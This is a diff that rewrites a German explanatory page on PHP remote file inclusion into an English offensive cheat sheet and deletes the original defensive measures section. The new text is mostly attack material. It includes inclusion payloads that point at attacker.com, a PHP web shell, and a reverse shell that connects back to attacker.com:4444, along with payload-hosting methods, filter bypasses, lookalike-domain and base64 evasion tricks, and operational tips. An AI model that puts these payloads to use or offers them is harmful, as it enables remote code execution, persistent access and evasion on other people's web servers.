@@ -1,68 +1,144 @@
-# RFI - remote file inclusion — execute code from external servers
+# execute code from remote servers. rce via external file inclusion.
 
-**Remote File Inclusion (RFI)** ist eine Schwachstelle in Webanwendungen, bei der externe Dateien von einem Remote-Server über unsichere Eingabeverarbeitung eingebunden werden können. Ähnlich wie bei Local File Inclusion (LFI) liegt die Ursache meist in fehlender oder unzureichender Validierung von Benutzereingaben, insbesondere in Funktionen wie `include()` oder `require()` in PHP.
+requires `allow_url_fopen=On` in php configuration.
 
-***
+## quick test payloads
 
-#### Voraussetzungen
+basic remote inclusion:
+```
+?file=http://attacker.com/shell.txt
+?page=http://evil.com/cmd.php
+?include=https://attacker.com/backdoor.txt
+```
 
-Eine erfolgreiche RFI-Attacke erfordert:
+## attack setup
 
-* Die PHP-Konfiguration `allow_url_fopen` muss aktiviert sein.
-* Die Webanwendung erlaubt die Einbindung externer Ressourcen ohne ausreichende Prüfung.
-
-***
-
-#### Auswirkungen
-
-Die Risiken bei RFI sind erheblich und reichen über die von LFI hinaus. Mögliche Folgen sind:
-
-* **Remote Code Execution (RCE)**
-* **Offenlegung sensibler Informationen**
-* **Cross-Site Scripting (XSS)**
-* **Denial of Service (DoS)**
-
-***
-
-#### Angriffsablauf
-
-1. Der Angreifer hostet eine Datei auf einem externen Server, z. B.:
-
+1. host malicious file on your server:
 ```php
-<?php echo "Hello World"; ?>
+# shell.txt on attacker.com
+<?php system($_GET['cmd']); ?>
 ```
 
-2. Die Webanwendung ruft eine Datei über einen URL-Parameter auf, z. B.:
-
+2. trigger inclusion via vulnerable parameter:
 ```
-http://webapp.example/index.php?lang=http://attacker.example/cmd.txt
+http://target.com/app.php?file=http://attacker.com/shell.txt&cmd=id
 ```
 
-3. Ohne Eingabefilterung wird die URL in eine PHP-Funktion wie `include()` übergeben:
+3. server downloads and executes your remote code.
 
+## payload hosting
+
+**simple php shell:**
 ```php
-<?php include($_GET['lang']); ?>
+<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
 ```
 
-4. Die Anwendung lädt und führt den externen Code aus. In diesem Fall würde „Hello World“ im Webinterface angezeigt oder im Hintergrund schädlicher Code ausgeführt.
+**reverse shell payload:**
+```php
+<?php
+$sock = fsockopen("attacker.com", 4444);
+exec("/bin/bash -i <&3 >&3 2>&3", $sock);
+?>
+```
 
-***
+**info gathering:**
+```php
+<?php
+echo "User: " . get_current_user() . "\n";
+echo "PWD: " . getcwd() . "\n";
+echo "OS: " . php_uname() . "\n";
+phpinfo();
+?>
+```
 
-#### Beispielstruktur eines RFI-Angriffs
+## hosting methods
 
-1. **Vorbereitung**: Angreifer stellt eine Datei wie `cmd.txt` mit Schadcode auf eigenem Server bereit.
-2.  **Injection**: Der URL-Parameter wird manipuliert, z. B.:
+**python http server:**
+```bash
+# host payloads
+echo '<?php system($_GET["cmd"]); ?>' > shell.txt
+python3 -m http.server 8080
+```
 
-    ```
-    http://webapp.example/index.php?lang=http://attacker.example/cmd.txt
-    ```
-3. **Ausführung**: Die Anwendung lädt die Datei über `include()` und führt den darin enthaltenen PHP-Code auf dem Zielsystem aus.
+**ngrok tunnel:**
+```bash
+# expose local server to internet
+ngrok http 8080
+# use ngrok url in rfi attack
+```
 
-***
+**free hosting platforms:**
+```
+pastebin.com/raw/[paste-id]
+github.com/user/repo/raw/main/shell.txt
+```
 
-#### Schutzmaßnahmen
+## bypass techniques
 
-* Deaktivierung von `allow_url_include` und `allow_url_fopen`.
-* Strenge Validierung oder Whitelisting von Eingaben.
-* Verzicht auf direkte Einbindung von Benutzereingaben.
-* Verwendung sicherer Frameworks mit Template-Engines.
+**protocol variations:**
+```
+http://attacker.com/shell.txt
+https://attacker.com/shell.txt
+ftp://attacker.com/shell.txt
+```
+
+**case sensitivity bypass:**
+```
+HTTP://attacker.com/shell.txt
+Http://attacker.com/shell.txt
+```
+
+**url encoding:**
+```
+?file=http%3A%2F%2Fattacker.com%2Fshell.txt
+```
+
+## detection evasion
+
+**legitimate-looking urls:**
+```
+http://jquery.com.attacker.com/shell.txt
+http://attacker.com/legitimate-file.txt
+```
+
+**indirect inclusion:**
+```
+# redirect chain
+http://attacker.com/redirect.php -> shell.txt
+```
+
+**obfuscated payloads:**
+```php
+# base64 encoded commands
+<?php system(base64_decode($_GET['b64cmd'])); ?>
+```
+
+## error-based information disclosure
+
+failed rfi attempts reveal:
+```
+# error messages show:
+- file paths and directory structure
+- php configuration details  
+- whether url includes are enabled
+- network connectivity restrictions
+```
+
+## operational notes
+
+- [!] rfi generates network traffic to your server - logs will show source
+- requires internet connectivity from target server
+- error messages reveal php config and restrictions
+- combine with other vulns for maximum impact
+- test for both http and https support
+
+**verification methods:**
+- check access logs on your server
+- use unique identifiers in payloads
+- monitor dns requests to your domain
+
+# TODO: add techniques for bypassing outbound filtering
